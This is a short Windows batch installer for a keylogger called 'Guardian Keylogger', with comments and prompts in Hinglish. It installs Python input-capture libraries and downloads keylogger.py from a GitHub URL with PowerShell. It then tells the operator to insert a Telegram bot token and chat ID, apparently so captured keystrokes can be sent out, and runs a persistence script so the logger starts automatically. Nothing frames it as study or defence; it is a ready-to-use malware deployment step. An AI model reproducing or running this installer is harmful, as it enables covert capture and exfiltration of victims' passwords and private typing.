@echo off
echo ================================================
echo     Guardian Keylogger Installer
echo ================================================

:: Dependencies install
echo Installing dependencies...
python -m pip install pynput requests pywin32 psutil --quiet

:: Download keylogger.py (raw link se)
echo Downloading latest keylogger...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Bloodlinebots/main/keylogger.py' -OutFile 'keylogger.py'"

:: Config reminder
echo.
echo ⚠️  Ab keylogger.py khol ke apna TELEGRAM_BOT_TOKEN aur CHAT_ID daal do.
echo.
pause

:: Auto-start setup
echo Setting up auto-start...
python setup_persistence.py

echo.
echo ✅ Setup complete! Restart your laptop.
pause
